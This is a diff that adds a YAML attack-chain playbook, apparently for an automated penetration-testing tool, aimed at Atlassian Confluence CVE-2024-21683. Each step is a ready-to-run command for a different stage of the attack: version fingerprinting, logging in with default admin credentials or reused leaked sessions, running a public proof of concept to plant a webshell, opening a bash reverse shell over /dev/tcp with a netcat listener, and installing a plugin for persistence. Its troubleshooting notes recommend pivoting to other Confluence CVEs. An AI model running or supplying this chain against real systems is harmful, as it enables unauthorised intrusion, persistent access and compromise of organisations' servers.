@@ -1,0 +1,72 @@
+chain_id: confluence_cve_2024_21683
+title: "Atlassian Confluence — CVE-2024-21683 authenticated RCE via Add a new language"
+severity: CRITICAL
+tags: [web, confluence, atlassian, cve-2024-21683, rce, authenticated]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-21683" }
+    - { banner_pattern: "(?i)atlassian|confluence" }
+    - { product_pattern: "(?i)confluence" }
+    - { path_pattern: "(?i)/admin/configurelanguage\\.action" }
+
+description: |
+  Confluence Data Center / Server 8.x before 8.5.9 (LTS) and the
+  9.x line before 9.0.1. Any user with the "Add a new language"
+  privilege can upload a JS bundle whose path is interpolated into
+  a Velocity-style template — turning the language pack into a
+  remote code execution gadget. CISA-cataloged June 2024;
+  exploited within 48h of patch release.
+
+steps:
+  - id: 1
+    title: "Fingerprint version"
+    command: |
+      curl -sk "https://$VICTIMA/login.action" | grep -Eo 'Confluence [0-9.]+' | head -1
+      curl -sk "https://$VICTIMA/server-info.action" -I
+
+  - id: 2
+    title: "Confirm you have an account that can reach the language endpoint"
+    command: |
+      # Default test creds first; otherwise reuse a leaked session.
+      curl -sk -c /tmp/cf.jar "https://$VICTIMA/dologin.action" \
+        --data 'os_username=admin&os_password=admin&login=Log+in&os_destination='
+      curl -sk -b /tmp/cf.jar "https://$VICTIMA/admin/configurelanguage.action" -I
+
+  - id: 3
+    title: "Public PoC — drop a webshell via the language pack upload"
+    command: |
+      git clone https://github.com/W01fh4cker/CVE-2024-21683-RCE /tmp/cf21683
+      python3 /tmp/cf21683/CVE-2024-21683.py -u https://$VICTIMA \
+        -user admin -pass admin -c 'id; uname -a'
+
+  - id: 4
+    title: "Reverse shell"
+    command: |
+      python3 /tmp/cf21683/CVE-2024-21683.py -u https://$VICTIMA \
+        -user admin -pass admin \
+        -c 'bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"'
+      # Listener on Kali:
+      nc -lvnp 4444
+
+  - id: 5
+    title: "Persistence — drop a Confluence plugin instead of a one-off shell"
+    command: |
+      # Confluence stores OBR plugins under <home>/plugins-osgi-cache/.
+      # Use the same RCE to write a JAR that survives restarts.
+
+common_errors:
+  - error: "language upload returns 403"
+    solution: |
+      The exploited account needs `Confluence Administrator` or at
+      least the language-management permission. A regular user is
+      not enough.
+  - error: "PoC reports 'no template injection — patched'"
+    solution: |
+      8.5.9 LTS / 9.0.1+ block the gadget. Pivot to CVE-2023-22527
+      (template injection via `velocity.tools`) or CVE-2023-22518
+      (auth bypass) if those windows match the version banner.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-21683
+  - https://confluence.atlassian.com/security/security-bulletin-may-21-2024-1387867145.html
